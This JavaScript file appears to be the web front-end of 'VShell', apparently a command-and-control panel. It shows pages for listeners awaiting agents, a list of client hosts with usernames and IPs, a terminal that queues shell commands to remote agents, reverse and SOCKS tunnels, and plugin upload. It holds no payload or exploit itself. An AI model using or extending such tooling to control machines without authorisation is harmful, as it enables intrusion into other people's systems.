// VShell Management Console — complete rewrite with real data rendering
const API = { base: '' };

async function api(path, opts = {}) {
    const token = localStorage.getItem('token');
    const headers = { 'Content-Type': 'application/json', ...opts.headers };
    if (token) headers['Authorization'] = 'Bearer ' + token;
    try {
        const r = await fetch(API.base + path, { ...opts, headers });
        if (r.status === 401) { window.location.href = '/login'; return null; }
        const json = await r.json();
        // Normalize: wrap result as data for backward compat with d.data usage
        if (json && json.code === 0 && json.result !== undefined) {
            json.data = json.result;
        }
        return json;
    } catch(e) { console.error('API error:', e); return null; }
}

function showPage(name) {
    const titles = { dashboard: 'Dashboard', listeners: 'Listeners', clients: 'Clients', tunnels: 'Tunnels', terminal: 'Terminal', plugins: 'Plugins', settings: 'Settings' };
    const titleEl = document.getElementById('pageTitle');
    if (titleEl) titleEl.textContent = titles[name] || 'Dashboard';
    // Find the correct content container
    const pageContent = document.getElementById('pageContent');
    const pageEl = document.getElementById('page-' + name);
    const container = pageEl || pageContent;
    if (container) container.innerHTML = '<div class="loading">Loading...</div>';
    const loaders = { dashboard: loadDashboard, listeners: loadListeners, clients: loadClients, tunnels: loadTunnels, terminal: loadTerminal, plugins: loadPlugins, settings: loadSettings };
    (loaders[name] || loadDashboard)(container);
    // Show the correct page div, hide others
    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
    if (pageEl) pageEl.classList.add('active');
}

async function loadDashboard(container) {
    const d = await api('/api/dashboard/overview');
    if (!d || !d.data) return;
    const s = d.data.stats || {};
    // Try both ID naming conventions
    for (let el of ['statClients', 'statTotal', 'statListeners', 'statTunnels', 'statHosts', 'stat-online', 'stat-total', 'stat-listeners', 'stat-tunnels']) {
        const e = document.getElementById(el);
        if (!e) continue;
        if (el === 'statClients' || el === 'stat-online') e.textContent = s.online_clients || 0;
        else if (el === 'statTotal' || el === 'stat-total') e.textContent = s.total_clients || 0;
        else if (el === 'statListeners' || el === 'stat-listeners') e.textContent = s.total_listeners || 0;
        else if (el === 'statTunnels' || el === 'stat-tunnels') e.textContent = s.active_tunnels || 0;
        else if (el === 'statHosts') e.textContent = s.total_hosts || 0;
    }
    if (container) container.innerHTML = '';
}

async function loadListeners(container) {
    const d = await api('/api/listeners');
    const items = d?.data || [];
    container.innerHTML = `
        <div style="display:flex;justify-content:space-between;margin-bottom:16px"><div></div><button class="btn" onclick="showCreateListener()">+ New Listener</button></div>
        <div class="card"><table><thead><tr><th>ID</th><th>Address</th><th>Mode</th><th>Verify Key</th><th>Remark</th><th>Actions</th></tr></thead><tbody>
            ${items.length ? items.map(l => `
                <tr>
                    <td>${l.id||l.Id||'-'}</td>
                    <td>${l.listen_addr||l.ListenAddr||'-'}</td>
                    <td>${l.mode||l.Mode||'-'}</td>
                    <td><code style="font-size:11px">${(l.vkey||l.Vkey||l.VerifyKey||'-').substring(0,16)}</code></td>
                    <td>${l.remark||l.Remark||''}</td>
                    <td>
                        <button class="btn btn-sm btn-success" onclick="api('/api/listener/start?id='+${l.id||l.Id}, {method:'POST'}).then(()=>loadListeners(document.getElementById('pageContent')))">Start</button>
                        <button class="btn btn-sm btn-danger" onclick="api('/api/listener/stop?id='+${l.id||l.Id}, {method:'POST'}).then(()=>loadListeners(document.getElementById('pageContent')))">Stop</button>
                        <button class="btn btn-sm btn-danger" onclick="if(confirm('Delete?'))api('/api/listeners?id='+${l.id||l.Id},{method:'DELETE'}).then(()=>loadListeners(document.getElementById('pageContent')))">Del</button>
                    </td>
                </tr>`).join('') : '<tr><td colspan="6" style="text-align:center;color:#666">No listeners — create one to start accepting agents</td></tr>'}
        </tbody></table></div>`;
}

function showCreateListener() {
    const modal = document.createElement('div'); modal.className = 'modal-overlay'; modal.id = 'listenerModal';
    modal.innerHTML = `<div class="modal"><h2>Create Listener</h2>
        <div class="form-row"><div class="form-group"><label>Listen Address</label><input id="f_addr" value="0.0.0.0:443"></div>
            <div class="form-group"><label>Mode</label><select id="f_mode"><option>http</option><option>https</option></select></div></div>
        <div class="form-row"><div class="form-group"><label>Verify Key</label><input id="f_vkey" value="vkey_"+Date.now()></div>
            <div class="form-group"><label>Remark</label><input id="f_remark"></div></div>
        <div class="modal-actions">
            <button class="btn" onclick="this.closest('.modal-overlay').remove()">Cancel</button>
            <button class="btn btn-success" onclick="createListener()">Create</button></div></div>`;
    document.body.appendChild(modal);
}
async function createListener() {
    await api('/api/listeners', {method:'POST', body:JSON.stringify({
        listen_addr: document.getElementById('f_addr').value,
        mode: document.getElementById('f_mode').value,
        vkey: document.getElementById('f_vkey').value,
        remark: document.getElementById('f_remark').value })});
    document.getElementById('listenerModal').remove();
    loadListeners(document.getElementById('pageContent'));
}

async function loadClients(container) {
    const d = await api('/api/clients');
    const items = d?.data || [];
    container.innerHTML = `<div class="card"><table><thead><tr><th>ID</th><th>Hostname</th><th>Username</th><th>OS</th><th>IP</th><th>Status</th><th>Last Seen</th><th>Actions</th></tr></thead><tbody>
        ${items.length ? items.map(c => `
            <tr>
                <td>${c.id||c.Id}</td>
                <td>${c.host_name||c.HostName||'-'}</td>
                <td>${c.user_name||c.UserName||'-'}</td>
                <td>${c.os_name||c.OsName||'-'}</td>
                <td>${c.local_ip||c.LocalIP||c.addr||c.Addr||'-'}</td>
                <td><span class="badge ${c.online ? 'badge-on' : 'badge-off'}">${c.online ? 'Online' : 'Offline'}</span></td>
                <td>${c.ping_check_time ? new Date(c.ping_check_time*1000).toLocaleString() : '-'}</td>
                <td><button class="btn btn-sm btn-danger" onclick="if(confirm('Delete client?'))api('/api/clients?id='+${c.id||c.Id},{method:'DELETE'}).then(()=>loadClients(document.getElementById('pageContent')))">Del</button></td>
            </tr>`).join('') : '<tr><td colspan="8" style="text-align:center;color:#666">No clients registered. Use CheckIn API or connect an agent.</td></tr>'}
    </tbody></table></div>`;
}

async function loadTunnels(container) {
    container.innerHTML = `<div class="card"><h2>Tunnel Management</h2><p style="color:#888;margin-bottom:16px">TCP/SOCKS5/Reverse proxy tunnels through connected agents.</p>
        <table><thead><tr><th>ID</th><th>Port</th><th>Mode</th><th>Client</th><th>Target</th><th>Status</th></tr></thead><tbody>
            <tr><td colspan="6" style="text-align:center;color:#666">Tunnels are created through the API. POST /api/tunnels with port/mode/client_id/target_addr.</td></tr>
        </tbody></table></div>`;
}

async function loadTerminal(container) {
    container.innerHTML = `
        <div class="form-row">
            <div class="form-group"><label>Client ID</label><input id="term_client" value="1" style="width:100px"></div>
            <div class="form-group"><label>Command</label><input id="term_cmd" value="whoami" style="width:300px" onkeydown="if(event.key==='Enter')runCommand()"></div>
            <div style="margin-top:18px"><button class="btn" onclick="runCommand()">Run</button> <button class="btn" onclick="document.getElementById('termOutput').textContent=''">Clear</button></div>
        </div>
        <div class="card"><div class="terminal" id="termOutput" style="min-height:400px">Ready.</div></div>`;
}
async function runCommand() {
    const output = document.getElementById('termOutput');
    const clientId = parseInt(document.getElementById('term_client').value) || 1;
    const cmd = document.getElementById('term_cmd').value || 'whoami';
    output.textContent += '\n$ ' + cmd + '\n';
    const d = await api('/api/runner', {method:'POST', body:JSON.stringify({client_id:clientId, command:cmd, timeout:30})});
    if (d?.data) output.textContent += '→ Command queued (ID: ' + d.data.id + ')\n';
    else output.textContent += '→ Error queuing command\n';
    output.scrollTop = output.scrollHeight;
    // Auto-poll for result
    if (d?.data?.id) pollResult(d.data.id);
}
async function pollResult(cmdId) {
    for (let i = 0; i < 12; i++) {
        await new Promise(r => setTimeout(r, 2000));
        const d = await api('/api/runner?id=' + cmdId);
        if (!d?.data) continue;
        const st = d.data.status || '';
        if (st === 'completed' || st === 'failed' || st === 'timeout') {
            const output = document.getElementById('termOutput');
            if (d.data.result) output.textContent += d.data.result + '\n';
            output.textContent += '→ [' + st + ']\n';
            output.scrollTop = output.scrollHeight;
            return;
        }
    }
}

async function loadPlugins(container) {
    const d = await api('/api/plugins');
    const items = d?.data || [];
    container.innerHTML = `<div class="card"><h2 style="display:flex;justify-content:space-between;align-items:center">
        <span>Installed Plugins</span><button class="btn" onclick="showUploadPlugin()">+ Upload</button></h2>
        <table><thead><tr><th>Name</th><th>Type</th><th>Size</th><th>Actions</th></tr></thead><tbody>
            ${items.length ? items.map(p => `
                <tr>
                    <td>${p.name||p.Name||'-'}</td>
                    <td>${p.type||p.Type||'-'}</td>
                    <td>${formatSize(p.size||p.Size)}</td>
                    <td><button class="btn btn-sm btn-danger" onclick="if(confirm('Delete plugin?'))api('/api/plugins?name='+encodeURIComponent(p.name||p.Name),{method:'DELETE'}).then(()=>loadPlugins(document.getElementById('pageContent')))">Uninstall</button></td>
                </tr>`).join('') : '<tr><td colspan="4" style="text-align:center;color:#666">No plugins in plugins/ directory. Upload one or copy files manually.</td></tr>'}
        </tbody></table></div>`;
}
function showUploadPlugin() {
    const modal = document.createElement('div'); modal.className = 'modal-overlay';
    modal.innerHTML = `<div class="modal"><h2>Upload Plugin</h2>
        <div class="form-group"><label>File</label><input type="file" id="pluginFile"></div>
        <div class="modal-actions">
            <button class="btn" onclick="this.closest('.modal-overlay').remove()">Cancel</button>
            <button class="btn btn-success" onclick="uploadPlugin()">Upload</button></div></div>`;
    document.body.appendChild(modal);
}
async function uploadPlugin() {
    const fileInput = document.getElementById('pluginFile');
    if (!fileInput.files.length) return alert('Select a file');
    const fd = new FormData();
    fd.append('plugin', fileInput.files[0]);
    await api('/api/plugins', {method:'POST', body:fd, headers:{}}); // no Content-Type for FormData
    document.querySelector('.modal-overlay').remove();
    loadPlugins(document.getElementById('pageContent'));
}

async function loadSettings(container) {
    const d = await api('/api/settings');
    const s = d?.data || {};
    container.innerHTML = `<div class="card"><h2>Settings</h2>
        <div class="form-row"><div class="form-group"><label>Web Title</label><input id="st_title" value="${s.web_title||'VShell'}"></div>
        <div class="form-group"><label>Web Port</label><input id="st_port" value="${s.web_port||'8082'}"></div></div>
        <div class="form-row"><div class="form-group"><label>Basic Auth</label><input value="${s.web_basic_auth ? 'Enabled' : 'Disabled'}" readonly></div>
        <div class="form-group"><label>Version</label><input value="1.0.0" readonly></div></div>
        <div class="form-group"><label>Admin Username</label><input id="st_user" value="${s.web_username||'admin'}"></div>
        <button class="btn" onclick="alert('Settings UI is read-only in this version. Edit conf/setting.conf directly.')">Save</button></div>`;
}

function formatSize(bytes) {
    if (!bytes || bytes === 0) return '-';
    const u = ['B','KB','MB','GB']; let i = 0; let s = bytes;
    while (s >= 1024 && i < u.length-1) { s /= 1024; i++; }
    return s.toFixed(1) + ' ' + u[i];
}

// Initialization
document.addEventListener('DOMContentLoaded', function() {
    const token = localStorage.getItem('token');
    const loginContainer = document.getElementById('login-container');
    const mainContainer = document.getElementById('main-container');
    const pageTitle = document.getElementById('pageTitle');

    // Toggle login/main view based on token
    if (token && loginContainer && mainContainer) {
        loginContainer.style.display = 'none';
        mainContainer.style.display = 'flex';
    } else if (!token && loginContainer) {
        // No token — show login, hide main
        if (mainContainer) mainContainer.style.display = 'none';
        loginContainer.style.display = 'block';
    }

    // Login form submit
    const loginForm = document.getElementById('login-form');
    if (loginForm) {
        loginForm.addEventListener('submit', async function(e) {
            e.preventDefault();
            const btn = document.getElementById('login-btn');
            const error = document.getElementById('login-error');
            btn.disabled = true;
            if (error) error.style.display = 'none';
            try {
                const r = await fetch('/api/login', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        username: document.getElementById('login-username').value,
                        password: document.getElementById('login-password').value
                    })
                });
                const d = await r.json();
                if (d.code === 0) {
                    const t = (d.result && d.result.token) || d.token;
                    localStorage.setItem('token', t);
                    if (loginContainer) loginContainer.style.display = 'none';
                    if (mainContainer) mainContainer.style.display = 'flex';
                    showPage('dashboard');
                } else {
                    if (error) { error.textContent = d.message || 'Login failed'; error.style.display = 'block'; }
                }
            } catch (err) {
                if (error) { error.textContent = 'Connection error'; error.style.display = 'block'; }
            } finally {
                btn.disabled = false;
            }
        });
    }

    // Logout button
    const logoutBtn = document.getElementById('logout-btn');
    if (logoutBtn) {
        logoutBtn.addEventListener('click', function() {
            localStorage.removeItem('token');
            if (mainContainer) mainContainer.style.display = 'none';
            if (loginContainer) loginContainer.style.display = 'block';
        });
    }

    // Fix: only call showPage when pageTitle element exists (SPA integrates differently)
    if (pageTitle) {
        const params = new URLSearchParams(window.location.search);
        const initialPage = params.get('page') || 'dashboard';
        if (token) showPage(initialPage);
    }

    document.querySelectorAll('.nav-item').forEach(a => {
        a.addEventListener('click', function(e) {
            const page = this.getAttribute('data-page') || (() => {
                const href = this.getAttribute('href') || '';
                const m = href.match(/[?&]page=(\w+)/);
                return m ? m[1] : 'dashboard';
            })();
            e.preventDefault();
            window.history.pushState({}, '', '/dashboard?page=' + page);
            showPage(page);
        });
    });
});
